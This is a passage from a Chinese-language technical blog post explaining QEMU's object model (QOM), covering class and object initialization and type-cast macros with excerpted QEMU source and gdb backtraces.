class="type">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="type">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> abstract;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;</span><br><span class="line">    TypeImpl *parent_type;</span><br><span class="line"></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> num_interfaces;</span><br><span class="line">    InterfaceImpl interfaces[MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>初始化<strong>Class</strong>结构体<br>  这里初始化类的最后一部分数据，即<strong>Class</strong>结构体。其往往在生成<strong>struct TypeImpl</strong>之后且对象初始化之前通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L337"><strong>type_initialize()</strong></a>进行，如下所示</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * #0  pci_device_class_init (klass=0x555557108080, data=0x0) at ../../qemu/hw/pci/pci.c:2630</span></span><br><span class="line"><span class="comment"> * #1  0x0000555555e9e904 in type_initialize (ti=0x5555570997c0) at ../../qemu/qom/object.c:418</span></span><br><span class="line"><span class="comment"> * #2  0x0000555555e9e65d in type_initialize (ti=0x555557091ba0) at ../../qemu/qom/object.c:366</span></span><br><span class="line"><span class="comment"> * #3  0x0000555555e9e65d in type_initialize (ti=0x555557091f60) at ../../qemu/qom/object.c:366</span></span><br><span class="line"><span class="comment"> * #4  0x0000555555ea02b7 in object_class_foreach_tramp (key=0x5555570920e0, value=0x555557091f60, opaque=0x7fffffffd8a0) at ../../qemu/qom/object.c:1133</span></span><br><span class="line"><span class="comment"> * #5  0x00007ffff7b9d6b8 in g_hash_table_foreach () at /lib/x86_64-linux-gnu/libglib-2.0.so.0</span></span><br><span class="line"><span class="comment"> * #6  0x0000555555ea03a7 in object_class_foreach (fn=0x555555ea0532 &lt;object_class_get_list_tramp&gt;, implements_type=0x555556274512 &quot;machine&quot;, include_abstract=false, opaque=0x7fffffffd8f0) at ../../qemu/qom/object.c:1155</span></span><br><span class="line"><span class="comment"> * #7  0x0000555555ea05c0 in object_class_get_list (implements_type=0x555556274512 &quot;machine&quot;, include_abstract=false) at ../../qemu/qom/object.c:1212</span></span><br><span class="line"><span class="comment"> * #8  0x0000555555bd8192 in select_machine (qdict=0x5555570e5ce0, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:1661</span></span><br><span class="line"><span class="comment"> * #9  0x0000555555bd935b in qemu_create_machine (qdict=0x5555570e5ce0) at ../../qemu/system/vl.c:2101</span></span><br><span class="line"><span class="comment"> * #10 0x0000555555bdd50f in qemu_init (argc=29, argv=0x7fffffffdc58) at ../../qemu/system/vl.c:3664</span></span><br><span class="line"><span class="comment"> * #11 0x0000555555e9282d in main (argc=29, argv=0x7fffffffdc58) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment"> * #12 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e92809 &lt;main&gt;, argc=argc@entry=29, argv=argv@entry=0x7fffffffdc58) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment"> * #13 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e92809 &lt;main&gt;, argc=29, argv=0x7fffffffdc58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdc48) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment"> * #14 0x000055555586ba15 in _start ()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">type_initialize</span><span class="params">(TypeImpl *ti)</span></span><br><span class="line">&#123;</span><br><span class="line">    TypeImpl *parent;</span><br><span class="line">    <span class="keyword">if</span> (ti-&gt;class) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ti-&gt;<span class="class"><span class="keyword">class</span> =</span> g_malloc0(ti-&gt;class_size);</span><br><span class="line"></span><br><span class="line">    parent = type_get_parent(ti);</span><br><span class="line">    <span class="keyword">if</span> (parent) &#123;</span><br><span class="line">        type_initialize(parent);</span><br><span class="line">        <span class="built_in">memcpy</span>(ti-&gt;class, parent-&gt;class, parent-&gt;class_size);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ti-&gt;<span class="class"><span class="keyword">class</span>-&gt;</span>properties = g_hash_table_new_full(g_str_hash, g_str_equal, <span class="literal">NULL</span>,</span><br><span class="line">                                                  object_property_free);</span><br><span class="line">    ti-&gt;<span class="class"><span class="keyword">class</span>-&gt;</span>type = ti;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (parent) &#123;</span><br><span class="line">        <span class="keyword">if</span> (parent-&gt;class_base_init) &#123;</span><br><span class="line">            parent-&gt;class_base_init(ti-&gt;class, ti-&gt;class_data);</span><br><span class="line">        &#125;</span><br><span class="line">        parent = type_get_parent(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ti-&gt;class_init) &#123;</span><br><span class="line">        ti-&gt;class_init(ti-&gt;class, ti-&gt;class_data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <strong>type_initialize()</strong>首先填充<strong>struct TypeImpl</strong>和<strong>Class</strong>结构体相关的字段，此时<strong>struct TypeImpl</strong>才完整的包含了类的所有信息。之后初始化所有父类的<strong>Class</strong>结构体，并依次调用所有父类的<strong>class_base_init()</strong>和自己的<strong>class_init()</strong>从而最终完成类的初始化。</p></li></ul><h3 id="对象初始化"><a href="#对象初始化" class="headerlink" title="对象初始化"></a>对象初始化</h3><p>根据<a href="#对象">前面章节</a>的介绍，<strong>QOM</strong>使用<strong>Object</strong>结构体来描述对象，则对象的初始化也就是该数据结构的初始化。<br><strong>QOM</strong>根据对象的类名称调用<strong>type_table_lookup()</strong>获取类对应的<strong>struct TypeImpl</strong>，然后使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L557"><strong>object_initialize_with_type()</strong></a>来创建并初始化一个对象实例，如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * #0  object_init_with_type (obj=0x5555574030d0, ti=0x5555570997c0) at ../../qemu/qom/object.c:424</span></span><br><span class="line"><span class="comment"> * #1  0x0000555555e9e95c in object_init_with_type (obj=0x5555574030d0, ti=0x55555709c960) at ../../qemu/qom/object.c:425</span></span><br><span class="line"><span class="comment"> * #2  0x0000555555e9ef40 in object_initialize_with_type (obj=0x5555574030d0, size=17776, type=0x55555709c960) at ../../qemu/qom/object.c:571</span></span><br><span class="line"><span class="comment"> * #3  0x0000555555e9f70f in object_new_with_type (type=0x55555709c960) at ../../qemu/qom/object.c:791</span></span><br><span class="line"><span class="comment"> * #4  0x0000555555e9f77b in object_new (typename=0x5555573cd3b0 &quot;i440FX&quot;) at ../../qemu/qom/object.c:806</span></span><br><span class="line"><span class="comment"> * #5  0x0000555555e96faa in qdev_new (name=0x5555573cd3b0 &quot;i440FX&quot;) at ../../qemu/hw/core/qdev.c:166</span></span><br><span class="line"><span class="comment"> * #6  0x0000555555a9999f in pci_new_internal (devfn=0, multifunction=false, name=0x5555573cd3b0 &quot;i440FX&quot;) at ../../qemu/hw/pci/pci.c:2168</span></span><br><span class="line"><span class="comment"> * #7  0x0000555555a99a40 in pci_new (devfn=0, name=0x5555573cd3b0 &quot;i440FX&quot;) at ../../qemu/hw/pci/pci.c:2181</span></span><br><span class="line"><span class="comment"> * #8  0x0000555555a99afd in pci_create_simple (bus=0x555557402480, devfn=0, name=0x5555573cd3b0 &quot;i440FX&quot;) at ../../qemu/hw/pci/pci.c:2199</span></span><br><span class="line"><span class="comment"> * #9  0x0000555555ab5ec0 in i440fx_pcihost_realize (dev=0x5555573cc050, errp=0x7fffffffd520) at ../../qemu/hw/pci-host/i440fx.c:274</span></span><br><span class="line"><span class="comment"> * #10 0x0000555555e97d8e in device_set_realized (obj=0x5555573cc050, value=true, errp=0x7fffffffd630) at ../../qemu/hw/core/qdev.c:510</span></span><br><span class="line"><span class="comment"> * #11 0x0000555555ea3595 in property_set_bool (obj=0x5555573cc050, v=0x5555573cd550, name=0x5555562f4071 &quot;realized&quot;, opaque=0x5555570edd00, errp=0x7fffffffd630) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment"> * #12 0x0000555555ea112b in object_property_set (obj=0x5555573cc050, name=0x5555562f4071 &quot;realized&quot;, v=0x5555573cd550, errp=0x7fffffffd630) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment"> * #13 0x0000555555ea5d64 in object_property_set_qobject (obj=0x5555573cc050, name=0x5555562f4071 &quot;realized&quot;, value=0x5555573cd270, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment"> * #14 0x0000555555ea14e4 in object_property_set_bool (obj=0x5555573cc050, name=0x5555562f4071 &quot;realized&quot;, value=true, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment"> * #15 0x0000555555e974a8 in qdev_realize (dev=0x5555573cc050, bus=0x55555735df80, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/hw/core/qdev.c:292</span></span><br><span class="line"><span class="comment"> * #16 0x0000555555e974e1 in qdev_realize_and_unref (dev=0x5555573cc050, bus=0x55555735df80, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/hw/core/qdev.c:299</span></span><br><span class="line"><span class="comment"> * #17 0x00005555559658fa in sysbus_realize_and_unref (dev=0x5555573cc050, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/hw/core/sysbus.c:261</span></span><br><span class="line"><span class="comment"> * #18 0x0000555555cae1c5 in pc_init1 (machine=0x555557355400, pci_type=0x5555562a5bbb &quot;i440FX&quot;) at ../../qemu/hw/i386/pc_piix.c:212</span></span><br><span class="line"><span class="comment"> * #19 0x0000555555caee7d in pc_init_v9_0 (machine=0x555557355400) at ../../qemu/hw/i386/pc_piix.c:523</span></span><br><span class="line"><span class="comment"> * #20 0x000055555595e63e in machine_run_board_init (machine=0x555557355400, mem_path=0x0, errp=0x7fffffffd910) at ../../qemu/hw/core/machine.c:1547</span></span><br><span class="line"><span class="comment"> * #21 0x0000555555bda9d6 in qemu_init_board () at ../../qemu/system/vl.c:2613</span></span><br><span class="line"><span class="comment"> * #22 0x0000555555bdace5 in qmp_x_exit_preconfig (errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2705</span></span><br><span class="line"><span class="comment"> * #23 0x0000555555bdd6a2 in qemu_init (argc=29, argv=0x7fffffffdc48) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment"> * #24 0x0000555555e9282d in main (argc=29, argv=0x7fffffffdc48) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment"> * #25 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e92809 &lt;main&gt;, argc=argc@entry=29, argv=argv@entry=0x7fffffffdc48) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment"> * #26 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e92809 &lt;main&gt;, argc=29, argv=0x7fffffffdc48, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdc38) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment"> * #27 0x000055555586ba15 in _start ()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">object_initialize_with_type</span><span class="params">(Object *obj, <span class="type">size_t</span> size, TypeImpl *type)</span></span><br><span class="line">&#123;</span><br><span class="line">    type_initialize(type);</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">memset</span>(obj, <span class="number">0</span>, type-&gt;instance_size);</span><br><span class="line">    obj-&gt;<span class="class"><span class="keyword">class</span> =</span> type-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    object_ref(obj);</span><br><span class="line">    object_class_property_init_all(obj);</span><br><span class="line">    obj-&gt;properties = g_hash_table_new_full(g_str_hash, g_str_equal,</span><br><span class="line">                                            <span class="literal">NULL</span>, object_property_free);</span><br><span class="line">    object_init_with_type(obj, type);</span><br><span class="line">    object_post_init_with_type(obj, type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">object_init_with_type</span><span class="params">(Object *obj, TypeImpl *ti)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (type_has_parent(ti)) &#123;</span><br><span class="line">        object_init_with_type(obj, type_get_parent(ti));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ti-&gt;instance_init) &#123;</span><br><span class="line">        ti-&gt;instance_init(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">object_post_init_with_type</span><span class="params">(Object *obj, TypeImpl *ti)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (ti-&gt;instance_post_init) &#123;</span><br><span class="line">        ti-&gt;instance_post_init(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type_has_parent(ti)) &#123;</span><br><span class="line">        object_post_init_with_type(obj, type_get_parent(ti));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>object_initialize_with_type()</strong>首先调用<strong>type_initialize()</strong>确保类被初始化，然后调用<strong>object_init_with_type()</strong>和<strong>objet_post_init_with_type()</strong>，从而递归调用对象和对象所有父类的对象初始化相关函数。</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p><strong>QOM</strong>同样实现了面向对象编程中的cast概念。根据<a href="#类">类</a>和<a href="#对象">对象</a>章节的介绍，相关结构体在起始偏移处存放了父类的结构体，因此向上转型始终是安全的；而为了实现向下转型，<strong>QOM</strong>通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/qom/object.h#L233"><strong>OBJECT_DECLARE_TYPE()</strong></a>宏声明了诸多的helper函数，如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * OBJECT_DECLARE_TYPE:</span></span><br><span class="line"><span class="comment"> * @InstanceType: instance struct name</span></span><br><span class="line"><span class="comment"> * @ClassType: class struct name</span></span><br><span class="line"><span class="comment"> * @MODULE_OBJ_NAME: the object name in uppercase with underscore separators</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This macro is typically used in a header file, and will:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   - create the typedefs for the object and class structs</span></span><br><span class="line"><span class="comment"> *   - register the type for use with g_autoptr</span></span><br><span class="line"><span class="comment"> *   - provide three standard type cast functions</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The object struct and class struct need to be declared manually.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJECT_DECLARE_TYPE(InstanceType, ClassType, MODULE_OBJ_NAME) \</span></span><br><span class="line"><span class="meta">    typedef struct InstanceType InstanceType; \</span></span><br><span class="line"><span class="meta">    typedef struct ClassType ClassType; \</span></span><br><span class="line"><span class="meta">    ... \</span></span><br><span class="line"><span class="meta">    DECLARE_OBJ_CHECKERS(InstanceType, ClassType, \</span></span><br><span class="line"><span class="meta">                         MODULE_OBJ_NAME, TYPE_##MODULE_OBJ_NAME)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * DECLARE_OBJ_CHECKERS:</span></span><br><span class="line"><span class="comment"> * @InstanceType: instance struct name</span></span><br><span class="line"><span class="comment"> * @ClassType: class struct name</span></span><br><span class="line"><span class="comment"> * @OBJ_NAME: the object name in uppercase with underscore separators</span></span><br><span class="line"><span class="comment"> * @TYPENAME: type name</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Direct usage of this macro should be avoided, and the complete</span></span><br><span class="line"><span class="comment"> * OBJECT_DECLARE_TYPE macro is recommended instead.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This macro will provide the three standard type cast functions for a</span></span><br><span class="line"><span class="comment"> * QOM type.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DECLARE_OBJ_CHECKERS(InstanceType, ClassType, OBJ_NAME, TYPENAME) \</span></span><br><span class="line"><span class="meta">    DECLARE_INSTANCE_CHECKER(InstanceType, OBJ_NAME, TYPENAME) \</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    DECLARE_CLASS_CHECKERS(ClassType, OBJ_NAME, TYPENAME)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * DECLARE_INSTANCE_CHECKER:</span></span><br><span class="line"><span class="comment"> * @InstanceType: instance struct name</span></span><br><span class="line"><span class="comment"> * @OBJ_NAME: the object name in uppercase with underscore separators</span></span><br><span class="line"><span class="comment"> * @TYPENAME: type name</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Direct usage of this macro should be avoided, and the complete</span></span><br><span class="line"><span class="comment"> * OBJECT_DECLARE_TYPE macro is recommended instead.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This macro will provide the instance type cast functions for a</span></span><br><span class="line"><span class="comment"> * QOM type.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DECLARE_INSTANCE_CHECKER(InstanceType, OBJ_NAME, TYPENAME) \</span></span><br><span class="line"><span class="meta">    static inline G_GNUC_UNUSED InstanceType * \</span></span><br><span class="line"><span class="meta">    OBJ_NAME(const void *obj) \</span></span><br><span class="line"><span class="meta">    &#123; return OBJECT_CHECK(InstanceType, obj, TYPENAME); &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * OBJECT_CHECK:</span></span><br><span class="line"><span class="comment"> * @type: The C type to use for the return value.</span></span><br><span class="line"><span class="comment"> * @obj: A derivative of @type to cast.</span></span><br><span class="line"><span class="comment"> * @name: The QOM typename of @type</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A type safe version of @object_dynamic_cast_assert.  Typically each class</span></span><br><span class="line"><span class="comment"> * will define a macro based on this type to perform type safe dynamic_casts to</span></span><br><span class="line"><span class="comment"> * this object type.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If an invalid object is passed to this function, a run time assert will be</span></span><br><span class="line"><span class="comment"> * generated.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJECT_CHECK(type, obj, name) \</span></span><br><span class="line"><span class="meta">    ((type *)object_dynamic_cast_assert(OBJECT(obj), (name), \</span></span><br><span class="line"><span class="meta">                                        __FILE__, __LINE__, __func__))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * DECLARE_CLASS_CHECKERS:</span></span><br><span class="line"><span class="comment"> * @ClassType: class struct name</span></span><br><span class="line"><span class="comment"> * @OBJ_NAME: the object name in uppercase with underscore separators</span></span><br><span class="line"><span class="comment"> * @TYPENAME: type name</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Direct usage of this macro should be avoided, and the complete</span></span><br><span class="line"><span class="comment"> * OBJECT_DECLARE_TYPE macro is recommended instead.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This macro will provide the class type cast functions for a</span></span><br><span class="line"><span class="comment"> * QOM type.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DECLARE_CLASS_CHECKERS(ClassType, OBJ_NAME, TYPENAME) \</span></span><br><span class="line"><span class="meta">    static inline G_GNUC_UNUSED ClassType * \</span></span><br><span class="line"><span class="meta">    OBJ_NAME##_GET_CLASS(const void *obj) \</span></span><br><span class="line"><span class="meta">    &#123; return OBJECT_GET_CLASS(ClassType, obj, TYPENAME); &#125; \</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    static inline G_GNUC_UNUSED ClassType * \</span></span><br><span class="line"><span class="meta">    OBJ_NAME##_CLASS(const void *klass) \</span></span><br><span class="line"><span class="meta">    &#123; return OBJECT_CLASS_CHECK(ClassType, klass, TYPENAME); &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * OBJECT_GET_CLASS:</span></span><br><span class="line"><span class="comment"> * @class: The C type to use for the return value.</span></span><br><span class="line"><span class="comment"> * @obj: The object to obtain the class for.</span></span><br><span class="line"><span class="comment"> * @name: The QOM typename of @obj.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function will return a specific class for a given object.  Its generally</span></span><br><span class="line"><span class="comment"> * used by each type to provide a type safe macro to get a specific class type</span></span><br><span class="line"><span class="comment"> * from an object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJECT_GET_CLASS(class, obj, name) \</span></span><br><span class="line"><span class="meta">    OBJECT_CLASS_CHECK(class, object_get_class(OBJECT(obj)), name)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * OBJECT_CLASS_CHECK:</span></span><br><span class="line"><span class="comment"> * @class_type: The C type to use for the return value.</span></span><br><span class="line"><span class="comment"> * @class: A derivative class of @class_type to cast.</span></span><br><span class="line"><span class="comment"> * @name: the QOM typename of @class_type.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A type safe version of @object_class_dynamic_cast_assert.  This macro is</span></span><br><span class="line"><span class="comment"> * typically wrapped by each type to perform type safe casts of a class to a</span></span><br><span class="line"><span class="comment"> * specific class type.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJECT_CLASS_CHECK(class_type, class, name) \</span></span><br><span class="line"><span class="meta">    ((class_type *)object_class_dynamic_cast_assert(OBJECT_CLASS(class), (name), \</span></span><br><span class="line"><span class="meta">                                               __FILE__, __LINE__, __func__))</span></span><br></pre></td></tr></table></figure><p>可以看到，<strong>QOM</strong>提供了<strong>OBJ_NAME()</strong>将任何一个<strong>struct Object</strong>转换为<strong>Object</strong>结构体、<strong>OBJ_NAME##_GET_CLASS()</strong>从<strong>struct Object</strong>提取<strong>Class</strong>结构体和<strong>OBJ_NAME##_CLASS</strong>从<strong>struct ObjectClass</strong>转换为<strong>Class</strong>结构体的函数。</p><p>由于<strong>struct Object</strong>的<strong>class</strong>字段指向对应的<strong>struct ObjectClass</strong>，而<strong>struct ObjectClass</strong>的<strong>type</strong>字段指向真实的<strong>struct TypeImpl</strong>内容,基于此，<strong>QOM</strong>通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L921"><strong>object_dynamic_cast_assert()</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/qom/object.c#L1008"><strong>object_class_dynamic_cast_assert()</strong></a>，检查目标类或对象是否为这些指针的祖先从而进行安全的转换，如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 